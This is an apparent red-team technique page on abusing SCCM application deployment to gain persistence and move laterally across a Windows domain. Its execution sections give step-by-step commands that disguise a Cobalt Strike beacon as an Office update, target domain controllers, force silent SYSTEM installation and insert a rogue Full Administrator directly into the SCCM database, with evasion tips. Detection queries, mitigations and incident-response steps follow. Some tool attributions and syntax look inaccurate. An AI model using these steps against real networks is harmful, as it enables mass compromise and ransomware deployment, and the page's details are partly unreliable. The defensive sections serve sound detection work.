# [PERSIST-SCHED-004]: SCCM Application Deployment Persistence

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SCHED-004 |
| **MITRE ATT&CK v18.1** | [T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) (adapted for SCCM context); [T1570 - Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570/) |
| **Tactic** | Persistence (TA0003) / Lateral Movement (TA0008) |
| **Platforms** | Windows AD (via SCCM), Windows Endpoint, Windows Server |
| **Severity** | **Critical** |
| **CVE** | N/A (configuration-based attack, but CVE-2024-43468 enables RCE on SCCM server) |
| **Technique Status** | ACTIVE (Actively exploited in the wild, especially with SCCM admin compromise) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All SCCM versions (ConfigMgr 2103, 2203, 2303, 2309, 2403, 2409); Windows AD integrated |
| **Patched In** | N/A - Requires policy enforcement; CVE-2024-43468 patch: KB5039580 (January 2025) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** System Center Configuration Manager (SCCM) is an enterprise systems management platform designed to deploy software, manage configurations, and enforce compliance across thousands of Windows devices in a domain. An attacker with compromised SCCM administrative credentials or remote code execution on the SCCM server can abuse the legitimate SCCM infrastructure to:

1. **Create malicious applications** (containing shells, backdoors, or malware)
2. **Package them as legitimate software deployments**
3. **Target specific machines or entire device collections** via SCCM
4. **Force automatic execution** of the malicious payload with SYSTEM privileges
5. **Maintain persistence indefinitely** because deployments are persistent features of SCCM (reinstalled after reboot)
6. **Move laterally at scale** across the entire domain with minimal detection

This is fundamentally different from traditional scheduled tasks because SCCM's role is to manage deployments at an organization level, making this attack particularly dangerous in enterprise environments.

**Attack Surface:** The attack targets SCCM administrative infrastructure:
- **SCCM Primary Site Server** (central management server)
- **SCCM Database** (SQL Server backend storing all configurations)
- **SMS Provider** (WMI interface to SCCM)
- **Management Points** (distribution servers)
- **Distribution Points** (content hosting servers)
- **AdminService API** (REST API for management)
- **SCCM Collections** (groups of targeted devices)
- **Application Deployments** (delivery mechanism for malicious payloads)

**Business Impact:** **Enterprise-wide compromise with centralized persistence and lateral movement.** An attacker can:
- Deploy ransomware to ALL managed endpoints simultaneously
- Deploy backdoors to Domain Controller endpoints for credential harvesting
- Move laterally from user workstations to critical servers
- Maintain persistence indefinitely (SCCM is designed for continuous deployment)
- Evade detection because SCCM deployments appear as legitimate system management activity
- Pivot to external networks (if SCCM manages remote/VPN devices)

**Technical Context:** Malicious deployment takes **2-10 minutes** (collection creation, app creation, deployment creation). The attack is **extremely stealthy** because:
1. SCCM deployments are expected system activity (no anomaly detection)
2. Logs are often not centrally monitored (stored locally on SCCM server)
3. The malicious application is executed with the context of the SCCM client agent (SYSTEM)
4. Deployments are automatically re-executed on reboot (persistence is built-in)
5. Multiple collections can be created to target specific machines without raising suspicion

### Operational Risk
- **Execution Risk:** **Low** - If SCCM admin credentials are compromised; **Very High** if using CVE-2024-43468 RCE
- **Stealth:** **Very High** - SCCM deployments blend perfectly with legitimate management activity
- **Reversibility:** **No** - Once deployed to managed endpoints, removal requires admin intervention on each machine; remediation requires SCCM admin access

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | Windows-13 | Ensure that SCCM Admin rights are restricted; Monitor SCCM deployments |
| **DISA STIG** | SI-7(2) | Information System Monitoring – Monitor for unauthorized SCCM deployments |
| **CISA SCuBA** | SCCM Security Baseline | Secure SCCM administrative access and monitor for suspicious deployments |
| **NIST 800-53** | AC-6, SA-10 | Least Privilege (restrict SCCM admin access); Software, Firmware, and Information Integrity Monitoring |
| **GDPR** | Art. 32 | Security of Processing – Prevent unauthorized software deployments across the organization |
| **DORA** | Art. 9 | Protection and Prevention – Detect and prevent unauthorized mass deployment of malware |
| **NIS2** | Art. 21 | Cyber Risk Management – Monitor systems management platforms for abuse |
| **ISO 27001** | A.9.1.1 | User Registration and De-registration – Control access to systems management platforms |
| **ISO 27005** | Risk Scenario | "Compromise of Centralized Management System" – Unauthorized deployment of malicious software at scale |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimal**: Compromised SCCM admin account (Full Administrator or custom role with deployment rights)
- **Alternative**: RCE on SCCM server via CVE-2024-43468 SQL injection (unauthenticated)
- **Alternative**: Compromised Distribution Point admin account

**Required Access:**
- Network access to SCCM Primary Site Server (TCP 445 SMB, TCP 1433 SQL, TCP 80/443 HTTP)
- Or: Direct administrative access to SCCM server (via Beacon/shell)
- Or: Access to SCCM AdminService API endpoint

**Supported Versions:**
- **SCCM**: ConfigMgr 2103, 2203, 2303, 2309, 2403, 2409 (all modern versions)
- **Windows**: Any version managed by SCCM (Server 2016+, Windows 10+)
- **Database**: SQL Server 2016-2022 (SCCM backend)

**Tools:**
- [SharpSCCM](https://github.com/GhostSec/SharpSCCM) (C# tool for SCCM exploitation)
- [MalSCCM](https://github.com/nettitude/MalSCCM) (Python/Ruby tool for lateral movement)
- [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (SCCM reconnaissance and exploitation)
- [PowerSCCM](https://github.com/PowerShellMafia/PowerSCCM) (PowerShell module for SCCM)
- Windows SCCM Administrative Console (if admin access available)
- WMI/CIM cmdlets (native Windows for SMS Provider interaction)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Identify SCCM Infrastructure

```powershell
# Discover SCCM site server via LDAP
$ldapPath = "LDAP://CN=System,CN=Microsoft,CN=Windows,CN=Sites,CN=Configuration,DC=yourdomain,DC=com"
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
$searcher.Filter = "(cn=*SMS*)"
$results = $searcher.FindAll()

foreach ($result in $results) {
    Write-Host "Found SCCM object: $($result.Path)"
}

# Enumerate SCCM site servers
[System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=System Management Container")).Filter = "(&(objectClass=mSSMSSiteServer))"
```

**What to Look For:**
- SCCM site servers in AD (OU structure)
- SCCM database servers (SQL Server instances)
- Management Point servers

### Check SCCM Admin Permissions

```powershell
# Check if current user has SCCM administrative rights
$smsProvider = Get-WmiObject -Namespace "root\sms" -Class "__Namespace" -List
if ($smsProvider) {
    Write-Host "[+] SCCM SMS Provider is accessible"
    
    # Enumerate SCCM site code
    $site = Get-WmiObject -Namespace "root\sms" -Class "SMS_Site" | Select-Object SiteCode, SiteName
    Write-Host "[+] SCCM Site Code: $($site.SiteCode)"
}

# Check if user has Full Administrator role
# (Requires WMI query to SCCM database)
```

**What to Look For:**
- If SMS Provider is accessible, SCCM is likely installed on this machine or network
- Successful WMI query indicates local SCCM admin or SMS Provider access

### Enumerate Managed Devices and Collections

```powershell
# List all device collections
$collections = Get-WmiObject -Namespace "root\sms\site_<SiteCode>" -Class "SMS_Collection" -Filter "CollectionType=2"
foreach ($collection in $collections) {
    Write-Host "Collection: $($collection.Name) - ID: $($collection.CollectionID)"
}

# Count devices in each collection
foreach ($collection in $collections) {
    $devices = Get-WmiObject -Namespace "root\sms\site_<SiteCode>" -Class "SMS_CollectionMembershipRule" -Filter "CollectionID='$($collection.CollectionID)'"
    Write-Host "$($collection.Name): $($devices.Count) devices"
}
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: SCCM Application Deployment via AdminService API (Stealthy)

**Supported Versions:** ConfigMgr 2103+ (AdminService API available)

#### Step 1: Enumerate SCCM Environment and Obtain Admin Token

**Objective:** Authenticate to SCCM AdminService and obtain a valid authentication token

**Command (PowerShell - Using current user context):**
```powershell
# Set variables
$SCCMServer = "sccm-server.yourdomain.com"
$AdminServiceURI = "https://$SCCMServer/AdminService/v1"

# Authenticate using current user (must be SCCM admin)
$credential = Get-Credential  # Use SCCM admin account

# Create a session to AdminService
$session = New-PSSession -ComputerName $SCCMServer -Credential $credential

# Test connectivity
Invoke-WebRequest -Uri "$AdminServiceURI/Version" -UseDefaultCredentials -SkipCertificateCheck

if ($?) {
    Write-Host "[+] AdminService authentication successful"
} else {
    Write-Host "[-] AdminService authentication failed"
}
```

**Expected Output:**
```
StatusCode        : 200
StatusDescription : OK
Content           : {"ApplicationVersion":"2309.2313"}
```

**What This Means:**
- The attacker has successfully authenticated to SCCM's AdminService
- They can now query and modify SCCM configurations via REST API

#### Step 2: Create a Malicious Application in SCCM

**Objective:** Register a new application object in SCCM database that points to malicious payload

**Command (PowerShell - Using SharpSCCM):**
```powershell
# Download and execute SharpSCCM
Invoke-WebRequest -Uri "https://github.com/GhostSec/SharpSCCM/releases/download/v1.9/SharpSCCM.exe" -OutFile "C:\temp\SharpSCCM.exe"

# Create malicious application
# Payload: Cobalt Strike beacon (copy-pasted to C:\temp\beacon.exe)

C:\temp\SharpSCCM.exe create application `
  -name "Microsoft Office 2024 Update" `
  -manufacturer "Microsoft Corporation" `
  -description "Critical security update for Microsoft Office" `
  -app-type "ApplicationDeployment" `
  -app-path "\\SCCM-SERVER\CCMDeploy\beacon.exe" `
  -app-parameters "-silent -persist" `
  -repo https://sccm-server.yourdomain.com:443/AdminService/v1 `
  -username "DOMAIN\sccmadmin" `
  -password "SecurePassword123!"
```

**Expected Output:**
```
[+] Application created successfully: Microsoft Office 2024 Update
[+] Application ID: SoftwareUpdates_XXXXX
[+] DeploymentType created: DeploymentType_Standard
```

**What This Means:**
- The malicious application is now registered in SCCM
- It appears as a legitimate software deployment ("Microsoft Office 2024 Update")
- The payload points to a network share where the beacon resides

**OpSec & Evasion:**
- Use legitimate-sounding names (Office, Teams, VPN Client, etc.)
- Set the manufacturer to Microsoft or known software vendors
- Create multiple versions to avoid pattern recognition
- Schedule deployments during maintenance windows

#### Step 3: Create or Modify SCCM Collection to Target Specific Devices

**Objective:** Create a collection containing the target devices for deployment

**Command (PowerShell - Using SharpSCCM):**
```powershell
# Create a new collection with a legitimate-sounding name
C:\temp\SharpSCCM.exe create collection `
  -name "Windows 10 Enterprise Devices - Patch Group 3" `
  -description "Devices requiring critical security updates" `
  -collection-type "Device" `
  -repo https://sccm-server.yourdomain.com:443/AdminService/v1 `
  -username "DOMAIN\sccmadmin" `
  -password "SecurePassword123!"

# Add specific device(s) to the collection
# Option 1: Add by device name
C:\temp\SharpSCCM.exe create collection-member `
  -collection-id "ABC00001" `
  -device-name "DC01" `  # Add domain controller to collection
  -repo https://sccm-server.yourdomain.com:443/AdminService/v1

# Option 2: Add by collection query rule (all domain controllers)
C:\temp\SharpSCCM.exe create collection-rule `
  -collection-id "ABC00001" `
  -rule-name "All Domain Controllers" `
  -rule-query "select SMS_R_System.* from SMS_R_System where SMS_R_System.OSType = '10' and SMS_R_System.Role = 'DomainController'" `
  -repo https://sccm-server.yourdomain.com:443/AdminService/v1
```

**Expected Output:**
```
[+] Collection created: Windows 10 Enterprise Devices - Patch Group 3
[+] Collection ID: ABC00001
[+] Added member: DC01
[+] Added query rule: All Domain Controllers (estimated 5 members)
```

**What This Means:**
- The collection now contains specific target devices (or query-based dynamic membership)
- When the deployment is created, only these devices will receive the malicious application
- The attacker can target high-value assets (DCs, servers) or large groups (all workstations)

#### Step 4: Create Malicious Deployment to Collection

**Objective:** Deploy the malicious application to the created collection with required installation

**Command (PowerShell - Using SharpSCCM):**
```powershell
# Create deployment with forced installation
C:\temp\SharpSCCM.exe create deployment `
  -app-id "SoftwareUpdates_XXXXX" `
  -collection-id "ABC00001" `
  -deployment-type "Required" `  # Required = forces installation
  -installation-deadline "2025-01-09 14:00:00" `
  -installation-purpose "Required" `
  -available-date "2025-01-09 13:00:00" `
  -notify-user "Yes" `
  -allow-user-interact "No" `  # No user interaction required
  -repo https://sccm-server.yourdomain.com:443/AdminService/v1 `
  -username "DOMAIN\sccmadmin" `
  -password "SecurePassword123!"
```

**Expected Output:**
```
[+] Deployment created successfully
[+] Deployment ID: ABC00002
[+] Target Collection: ABC00001 (5 devices)
[+] Installation Deadline: 2025-01-09 14:00:00 UTC
[+] Deployment Type: Required
```

**What This Means:**
- The malicious application is now assigned to deploy to the collection
- "Required" deployment type forces installation without user interaction
- Devices will begin downloading and installing the beacon at the specified deadline
- Users will receive a notification but cannot cancel the installation

**OpSec & Evasion:**
- Set deadline during business hours to blend with normal updates
- Use compliance-related descriptions (e.g., "Security Update", "Patch Tuesday")
- Space out deployments to avoid mass detection
- Create multiple smaller deployments targeting different collections

#### Step 5: Force Devices to Check In and Execute Deployment

**Objective:** Force target devices to immediately request their policy and execute the deployment

**Command (PowerShell):**
```powershell
# Force policy evaluation on target devices
# Option 1: Via machine policy client action WMI call
$computerNames = @("DC01", "SERVER01", "WORKSTATION02")

foreach ($computer in $computerNames) {
    $invokeWmiMethod = @{
        ComputerName = $computer
        Namespace = "root\ccm"
        ClassName = "SMS_Client"
        MethodName = "TriggerSchedule"
        ArgumentList = "{00000000-0000-0000-0000-000000000113}"  # GUID for policy evaluation
    }
    
    Invoke-WmiMethod @invokeWmiMethod -Credential $credential
    Write-Host "[+] Policy evaluation triggered on $computer"
}

# Option 2: Using PowerShell Remoting (if enabled)
Invoke-Command -ComputerName $computerNames -Credential $credential -ScriptBlock {
    [wmiclass]"\\.\root\ccm:SMS_Client" | Invoke-WmiMethod -Name TriggerSchedule -ArgumentList("{00000000-0000-0000-0000-000000000113}")
    Write-Host "[+] Policy evaluation triggered"
}
```

**Expected Output:**
```
[+] Policy evaluation triggered on DC01
[+] Policy evaluation triggered on SERVER01
[+] Policy evaluation triggered on WORKSTATION02
```

**What This Means:**
- Target devices are forced to immediately check in with SCCM Management Points
- They download their policy which includes the malicious deployment
- The SCCM client agent (running as SYSTEM) begins executing the deployment
- The beacon is installed with SYSTEM privileges within minutes

---

### METHOD 2: Direct SQL Database Injection (Fast Lateral Movement)

**Supported Versions:** All SCCM versions (requires SQL database access)

#### Step 1: Gain Access to SCCM Database

**Objective:** Obtain administrative access to the SCCM SQL Server database

**Command (PowerShell - If you have local admin on SCCM server):**
```powershell
# Connect to local SCCM SQL instance
$sqlInstance = "SCCM-Server\ConfigMgr"
$sqlDatabase = "CM_XXX"  # Replace XXX with site code

# Connect using Windows authentication (current user must be SQL admin)
$connection = New-Object System.Data.SqlClient.SqlConnection
$connection.ConnectionString = "Server=$sqlInstance;Database=$sqlDatabase;Integrated Security=true;"
$connection.Open()

if ($connection.State -eq "Open") {
    Write-Host "[+] Connected to SCCM database successfully"
} else {
    Write-Host "[-] Failed to connect to SCCM database"
}

$connection.Close()
```

#### Step 2: Insert Malicious Admin User into Database

**Objective:** Directly insert a new SCCM administrator into the database, bypassing role-based access control

**Command (SQL - Executed against SCCM database):**
```sql
-- Get current user's SID (in hex format)
-- First, find an existing admin to understand the structure
SELECT AdminID, AdminName, LogonName, AccountStatus
FROM RBAC_Admins
WHERE AdminName LIKE '%sccmadmin%'

-- Create new admin user in database
DECLARE @AdminID INT;
SELECT @AdminID = MAX(AdminID) + 1 FROM RBAC_Admins;

INSERT INTO RBAC_Admins (AdminID, AdminName, LogonName, DisplayName, AdminType, AccountStatus, CreatedDate, CreatedBy, ModifiedDate, ModifiedBy)
VALUES (@AdminID, 'EvilAdmin', 'YOURDOMAIN\EvilUser', 'Legitimate Support Account', 3, 1, GETDATE(), 'SYSTEM', GETDATE(), 'SYSTEM');

-- Grant Full Administrator role (SMS0001R) to the new user
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES (@AdminID, 'SMS0001R', 'SMS00ALL', '29');  -- SMS00ALL = all scopes

-- Verify insertion
SELECT * FROM RBAC_Admins WHERE LogonName LIKE '%EvilUser%'
```

**Expected Output:**
```
(1 row affected)
(1 row affected)
AdminID    AdminName    LogonName                 DisplayName                 AdminType  AccountStatus
--------   -----------  -----                     ---------                   ---------  ---------
42         EvilAdmin    YOURDOMAIN\EvilUser      Legitimate Support Account  3          1
```

**What This Means:**
- A new admin account has been created directly in the SCCM database
- The account has Full Administrator role (equivalent to SCCM_Admins group)
- The attacker can now use this account to manage SCCM via console or API
- The account creation is logged but appears as if a system account created it

#### Step 3: Use New Admin Privileges to Deploy Malicious Application

*Follow the same steps as METHOD 1, Steps 2-5, but using the new database-created admin account*

---

## 6. TOOLS & COMMANDS REFERENCE

### [SharpSCCM](https://github.com/GhostSec/SharpSCCM)

**Version:** 1.9+

**Installation:**
```powershell
# Download from GitHub releases
Invoke-WebRequest -Uri "https://github.com/GhostSec/SharpSCCM/releases/download/v1.9/SharpSCCM.exe" -OutFile "SharpSCCM.exe"
```

**Key Commands:**
```cmd
# Enumerate SCCM
SharpSCCM.exe get site-push-settings -mp <management-point> -sc <site-code>

# Create application
SharpSCCM.exe create application -name "AppName" -app-path "\\server\share\payload.exe"

# Create deployment
SharpSCCM.exe create deployment -app-id <app-id> -collection-id <coll-id> -deployment-type "Required"

# Execute arbitrary query
SharpSCCM.exe execute query -query "SELECT * FROM SMS_Collection" -repo <api-url> -username <user> -password <pass>
```

---

### [MalSCCM](https://github.com/nettitude/MalSCCM)

**Version:** 1.0+

**Installation:**
```bash
git clone https://github.com/nettitude/MalSCCM.git
cd MalSCCM
```

**Key Commands:**
```bash
# Remote SCCM exploitation without requiring local access
python3 MalSCCM.py -server <sccm-server> -site-code <code> -target-device <device-name> -payload <payload-path>
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Suspicious SCCM Application Creation

**Rule Configuration:**
- **Required Index:** `main` (Windows Event Logs), `sccm_logs`
- **Required Sourcetype:** `WinEventLog:System`, `ConfigMgr_StatusMessages`
- **Alert Threshold:** Any application creation by non-standard admin accounts
- **Applies To Versions:** All SCCM versions

**SPL Query:**
```spl
index=sccm_logs OR index=main sourcetype=ConfigMgr_StatusMessages
| search MessageID=30000 OR MessageID=30041
| search (NewApplicationName NOT IN ("Microsoft Office", "Windows Defender", "Adobe Reader"))
| stats count by CreatedBy, NewApplicationName, CollectionName, _time
| where count > 0
| table _time, CreatedBy, NewApplicationName, CollectionName
```

**What This Detects:**
- New applications created outside normal naming patterns
- Applications created by unusual admin accounts
- Applications deployed to suspicious collections

---

### Rule 2: Suspicious SCCM Collection Modifications

**SPL Query:**
```spl
index=sccm_logs MessageID=30065
| search NewCollectionName NOT IN ("All Systems", "All Users and User Groups", "Windows 10", "Windows 11")
| where DaysOld < 7
| stats count by ModifiedBy, NewCollectionName, _time
| where count > 3
```

**What This Detects:**
- New collections created with unusual names
- Multiple collection modifications by a single user (mass targeting)
- Recent collections that deviate from standard naming conventions

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious SCCM AdminService API Access

**Rule Configuration:**
- **Required Table:** `AuditLogs`, `CloudAppEvents`
- **Alert Severity:** **High**
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
CloudAppEvents
| where Application == "ConfigurationManager" OR Application == "SCCM"
| where ActionType in ("AdminService", "CreateApplication", "CreateDeployment", "ModifyCollection")
| where InitiatingUser !in ("SCCMServiceAccount", "ConfigMgrAdmin")  // Exclude service accounts
| summarize EventCount = count() by InitiatingUser, ActionType, bin(TimeGenerated, 5m)
| where EventCount > 5  // Multiple actions in 5 minutes = suspicious
| project TimeGenerated, InitiatingUser, ActionType, EventCount
```

**What This Detects:**
- Unusual SCCM API calls from non-service accounts
- Rapid creation of applications/deployments (signs of mass exploitation)

---

### Query 2: Application Deployment to Unexpected Collections

**KQL Query:**
```kusto
let HighValueCollections = dynamic(["All Domain Controllers", "All Servers", "Critical Infrastructure"]);

let SuspiciousDeployments = ConfigManagerEvents
| where EventType == "ApplicationDeploymentCreated"
| where TargetCollectionName in (HighValueCollections)
| where CreatedBy !in ("ConfigMgrAdmin", "SCCM_ServiceAccount");

SuspiciousDeployments
| extend AppName = tostring(parse_json(Properties).ApplicationName)
| extend CreatedTime = todatetime(CreatedDateTime)
| project TimeGenerated = CreatedTime, User = CreatedBy, App = AppName, TargetCollection = TargetCollectionName
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (Process Creation)**
- Monitor for: SCCM client (ccmexec.exe) spawning unusual child processes
- Filter: `ParentImage=*ccmexec.exe AND CommandLine contains ("cmd", "powershell", "\\\\", "http")`

**Event ID: 4674 (Sensitive Privilege Use)**
- Monitor for: SCCM client using elevated privileges unusually

**Manual Configuration (Group Policy):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable **Audit Process Creation** (Success and Failure)
4. Run `gpupdate /force`

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.22">
  <EventFiltering>
    <!-- Detect SCCM client spawning command shells -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">ccmexec.exe</ParentImage>
      <Image condition="image">cmd.exe;powershell.exe;bash.exe</Image>
    </ProcessCreate>
    
    <!-- Detect SCCM-related network activity to unusual destinations -->
    <NetworkConnect onmatch="include">
      <Image condition="contains">ccmexec;CcmExec</Image>
      <DestinationPort condition="exclude">80;443;3389;445</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

---

## 11. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious SCCM Administrative Activity

**Alert Name:** "Suspicious SCCM management activity detected"
- **Severity:** **High**
- **Description:** Unusual SCCM administrative operations detected (app creation, deployment, admin account creation)
- **Remediation:**
  1. Verify application and deployment legitimacy
  2. Check SCCM admin account creation against change requests
  3. If unauthorized, delete the deployment, application, and collection immediately
  4. Remove suspicious admin accounts from RBAC

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Restrict SCCM Administrative Access via RBAC**

Implement the principle of least privilege within SCCM.

**Manual Steps (SCCM Console):**
1. Go to **Administration** → **Security** → **Administrative Users**
2. Review all assigned admin roles
3. Remove unnecessary Full Administrator assignments
4. Create custom roles with minimum required permissions:
   - **Application Manager** (only manage applications, no deployment)
   - **Deployment Manager** (only manage deployments, no application creation)
   - **Collection Viewer** (read-only access to collections)
5. Assign roles to specific collections/scopes to limit impact

**Manual Steps (SQL - Create custom role):**
```sql
-- Create a limited "Software Packager" role (no deployment rights)
INSERT INTO RBAC_Roles (RoleID, RoleName, Description, IsBuiltIn, IsVisible)
VALUES ('SMS0005R', 'Software Packager', 'Can create applications but not deploy', 0, 1);

-- Grant only application management permissions
INSERT INTO RBAC_Permissions (RoleID, PermissionID, PermissionType)
VALUES ('SMS0005R', 'SMS0001', 'APPLICATION');  -- APPLICATION_READ
```

---

**2. Enable SCCM Audit Logging and Monitor for Suspicious Activities**

**Manual Steps (SCCM Console):**
1. Go to **Administration** → **Site Configuration** → **Servers and Site System Roles**
2. Select **SMS Provider**
3. Properties → **Reporting** → Enable **Audit Log**
4. Configure audit log retention (minimum 90 days)
5. Forward logs to centralized SIEM (Splunk, Sentinel)

**Manual Steps (PowerShell):**
```powershell
# Enable auditing for all SCCM events
$smsProvider = Get-WmiObject -Namespace "root\sms\site_<SiteCode>" -Class "SMS_SiteSystemServer" -Filter "RoleName LIKE '%SMS Provider%'"

# Enable audit logging
Set-WmiInstance -InputObject $smsProvider -Arguments @{LogEnabled=$true}
```

---

**3. Implement Network Segmentation for SCCM Infrastructure**

**Manual Steps:**
1. **Isolate SCCM Primary Site Server** on a separate network segment
2. **Restrict access** to SCCM server:
   - TCP 445 (SMB): Only from SCCM admins
   - TCP 1433 (SQL): Only from SCCM components
   - TCP 80/443 (HTTP): Only from SCCM clients on specified subnets
3. **Use VPN/bastion host** for remote SCCM administration
4. **Disable direct RDP** to SCCM server (use bastion host)

**Network ACL Rules:**
```
Allow: Domain Admins → SCCM Server:445 (SMB)
Allow: SCCM Clients → SCCM Server:80,443 (HTTP)
Allow: SCCM Server → SQL Server:1433 (Database)
Deny: All other traffic
```

---

**4. Require Multi-Factor Authentication for SCCM Administrative Access**

**Manual Steps (Entra ID + Conditional Access):**
1. Go to **Entra ID** → **Security** → **Conditional Access**
2. Create policy: "Require MFA for SCCM Admins"
3. **Assignments:**
   - Users: SCCM_Admins security group
   - Cloud apps: SCCM AdminService API
4. **Access controls:**
   - Require: Multi-factor authentication
5. Enable policy

---

### Priority 2: HIGH

**5. Monitor SCCM AdminService API Access**

**Manual Steps:**
1. Enable AdminService API logging (if not already enabled)
2. Configure IIS logging on SCCM server
3. Forward logs to centralized SIEM
4. Create alerts for:
   - CreateApplication operations
   - CreateDeployment operations
   - ModifyCollection operations
   - Admin account creation

---

**6. Implement Application Whitelisting for SCCM Deployments**

**Manual Steps:**
1. Use Microsoft Defender Application Guard or AppLocker to restrict what SCCM can deploy
2. Configure SCCM to only deploy applications signed with organizational certificates
3. Enable Code Integrity policy (Device Guard) on endpoints

---

**Validation Command (Verify Mitigations):**
```powershell
# Check SCCM admin accounts and their roles
$admins = Get-WmiObject -Namespace "root\sms\site_<SiteCode>" -Class "SMS_Admin"
foreach ($admin in $admins) {
    Write-Host "Admin: $($admin.Name) - Role: $($admin.RoleID)"
}

# Expected Output: Limited roles assigned, no service accounts with Full Admin

# Verify audit logging is enabled
$provider = Get-WmiObject -Namespace "root\sms\site_<SiteCode>" -Class "SMS_SiteSystemServer" -Filter "RoleName LIKE '%SMS Provider%'"
Write-Host "Audit Logging Enabled: $($provider.LogEnabled)"

# Expected Output: True
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**SCCM Database Artifacts:**
- New application with suspicious name (e.g., "Microsoft Office 2024 Update" when Office 2021 is deployed)
- New collection created outside change management window
- New admin account in RBAC_Admins table
- Deployment with immediate deadline (forces immediate execution)

**Network Artifacts:**
- SCCM client (ccmexec.exe) connecting to unusual IP addresses
- SCCM Management Point serving unusual content
- Large data transfers from SCCM Distribution Points outside normal maintenance window

**File System:**
- Unsigned executables in CCMCache directory (C:\Windows\CCMCache)
- Scheduled tasks created by ccmexec.exe (unusual)
- Recently modified SCCM log files with suspicious entries

---

### Forensic Artifacts

**SCCM Logs:**
- `C:\Program Files\Microsoft Configuration Manager\Logs\` - SCCM site server logs
- Look for: `ApplicationDeployment`, `Collection`, `AdminService` related messages
- Client logs: `C:\Windows\CCM\Logs\` - SCCM client agent logs

**SQL Database:**
- `RBAC_Admins` table for unauthorized accounts
- `dbo.vAdmin` view for admin audit
- `dbo.vApplicationDeployment` for deployed applications
- Audit logs (if enabled): `CM_<SiteCode>.dbo.vStatusMessagesWithStrings`

**Windows Event Logs:**
- Event ID 4688 (Process Creation) - ccmexec spawning shells
- Event ID 4672 (Admin Logon) - suspicious admin sign-ins
- Event ID 4719 (Audit Policy Change) - if attacker disables auditing

---

### Response Procedures

**1. Isolate:**

```powershell
# Disable SCCM client service on suspected systems
Stop-Service -Name "ccmexec" -Force

# Disable SCCM client startup
Set-Service -Name "ccmexec" -StartupType Disabled

# Disconnect network if ransomware suspected
Disable-NetAdapter -Name "*" -Confirm:$false
```

**2. Collect Evidence:**

```powershell
# Export SCCM database for forensics
Backup-SqlDatabase -ServerInstance "SCCM-Server\ConfigMgr" -Database "CM_XXX" -BackupFile "C:\incident\SCCM_Backup.bak"

# Export audit logs from SCCM
Get-EventLog -LogName "Application" -Source "ConfigMgr" -Newest 1000 | Export-Csv "C:\incident\SCCM_Events.csv"

# Collect CCMCache for analysis
Copy-Item -Path "C:\Windows\CCMCache" -Destination "C:\incident\CCMCache" -Recurse
```

**3. Remediate:**

```powershell
# Delete malicious application from SCCM
# (Requires SCCM console or SQL access)

# Delete malicious deployment
# (Requires SCCM console)

# Delete malicious collection
# (Requires SCCM console)

# Remove unauthorized admin accounts from database
# (Requires SQL access)
DELETE FROM RBAC_Admins WHERE AdminName = 'EvilAdmin'
DELETE FROM RBAC_ExtendedPermissions WHERE AdminID = <suspicious-id>

# Reset SCCM admin credentials
# (Via SCCM console)

# Force policy refresh on all clients
# (Via SCCM console: Administration → Collections → Target Collection → Client Notification → Download Computer Policy)
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker compromises SCCM admin account via phishing |
| **2** | **Persistence** | [PERSIST-CLOUD-001] Entra ID Backdoor | Attacker establishes persistent cloud identity access |
| **3** | **Privilege Escalation** | [PE-VALID-008] SCCM NAA Privilege Escalation | Attacker escalates to full SCCM admin via Network Access Account |
| **4** | **Current Step** | **[PERSIST-SCHED-004]** | **Attacker deploys malicious applications via SCCM** |
| **5** | **Lateral Movement** | [LM-AUTH-012] SCCM Credential Harvesting | Attacker uses SCCM to target Domain Controllers for credential theft |
| **6** | **Impact** | [I-RANSOM-001] Ransomware via SCCM | Attacker deploys RansomExx to all managed endpoints |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Storm-2603 SCCM Abuse (2024-2025)

- **Target:** Large enterprise with hybrid AD/Azure and SCCM deployment
- **Timeline:** Initial compromise via SharePoint RCE (July 2024); SCCM abuse discovered (November 2024)
- **Technique Status:** Active exploitation of SCCM for lateral movement
- **Attack Flow:**
  1. Exploited SharePoint RCE to gain initial SYSTEM shell on SharePoint server
  2. Enumerated SCCM infrastructure via LDAP and WMI
  3. Discovered SCCM database was accessible via SMB from compromised SharePoint server
  4. Directly inserted malicious admin account into SCCM database
  5. Used malicious admin account to create and deploy Cobalt Strike beacon to all domain controllers
  6. Moved laterally to Domain Controllers via SCCM deployment
  7. Dumped LSASS on Domain Controllers for Domain Admin credentials
- **Impact:** Complete domain compromise; adversary maintained access for 4+ months
